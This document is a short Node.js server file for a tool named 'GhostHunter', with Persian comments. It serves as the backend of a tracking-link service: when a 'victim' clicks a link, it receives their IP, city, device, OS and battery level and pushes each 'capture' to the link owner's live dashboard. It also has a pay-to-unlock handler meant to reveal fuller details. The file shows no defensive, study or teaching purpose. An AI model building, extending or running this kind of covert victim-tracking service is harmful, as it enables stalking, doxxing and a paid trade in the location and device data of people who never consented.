const express = require('express');
const http = require('http');
const { Server } = require("socket.io");
const path = require('path');

const app = express();
const server = http.createServer(app);
const io = new Server(server);

app.use(express.static(path.join(__dirname, 'public')));

// ذخیره موقت شکارها (در رم سرور)
let captures = [];

io.on('connection', (socket) => {
    
    // وقتی کسی (صاحب لینک) وارد پنل میشه
    socket.on('join-dashboard', () => {
        // شکارهای قبلی رو بهش نشون بده
        socket.emit('update-captures', captures);
    });

    // وقتی یک قربانی روی لینک کلیک کرد و اطلاعاتش اومد
    socket.on('victim-data', (data) => {
        const victimInfo = {
            id: Date.now(),
            ip: data.ip,
            city: data.city || 'Unknown',
            device: data.device,
            os: data.os,
            battery: data.battery + '%',
            time: new Date().toLocaleTimeString(),
            isPaid: false // اولش اطلاعات دقیق قفله
        };
        
        captures.unshift(victimInfo); // اضافه به اول لیست
        if (captures.length > 20) captures.pop(); // فقط ۲۰ تای آخر رو نگه دار

        // ارسال به داشبورد (صدای آژیر پخش میشه)
        io.emit('new-capture', victimInfo);
    });

    // وقتی کسی پول داد و خواست اطلاعات رو باز کنه
    socket.on('unlock-data', (id) => {
        // اینجا باید منطق پرداخت باشه. فعلا برای دمو باز میکنیم
        io.emit('data-unlocked', id);
    });
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => console.log(`GhostHunter running on port ${PORT}`));
